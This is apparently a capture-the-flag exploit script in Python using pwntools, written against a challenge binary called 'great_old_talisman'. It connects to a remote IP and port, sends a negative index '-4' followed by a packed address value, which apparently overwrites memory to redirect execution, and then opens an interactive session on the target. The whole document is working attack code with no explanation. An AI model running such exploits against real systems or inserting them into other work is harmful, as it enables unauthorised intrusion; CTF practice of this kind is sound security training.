#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./great_old_talisman',checksec=False)
#p = process()
p = remote('94.237.63.224',47332)
p.sendline(b'-4')
p.send(p32(0x135a))

p.interactive()
